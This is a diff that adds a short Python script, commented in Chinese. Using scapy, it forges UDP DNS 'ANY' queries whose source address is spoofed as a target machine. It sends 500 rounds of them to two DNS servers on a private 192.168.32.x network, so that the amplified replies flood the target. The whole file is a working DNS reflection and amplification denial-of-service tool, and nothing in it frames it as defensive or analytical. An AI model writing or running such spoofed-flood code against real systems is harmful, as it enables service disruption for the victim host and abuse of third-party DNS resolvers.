@@ -1,0 +1,21 @@
+from scapy.all import IP, UDP, DNS, DNSQR, send
+
+def send_dns_request(dns_server_ip, target_ip, query_domain):
+    # 构造DNS请求，源IP伪装为目标服务器IP
+    dns_request = IP(dst=dns_server_ip, src=target_ip) / \
+                  UDP(dport=53) / \
+                  DNS(rd=1, qd=DNSQR(qname=query_domain, qtype="ANY"))
+    
+    # 发送DNS请求
+    send(dns_request)
+
+# 示例使用
+dns_server1 = "192.168.32.143"
+dns_server2 = "192.168.32.2"  
+target_ip = "192.168.32.141"  # 伪造的源IP，即目标服务器
+domain_to_query = "baidu.com"  # 查询的域名
+
+for i in range (500):
+    send_dns_request(dns_server1, target_ip, domain_to_query)
+    send_dns_request(dns_server2, target_ip, domain_to_query)
+    print("Send OK")
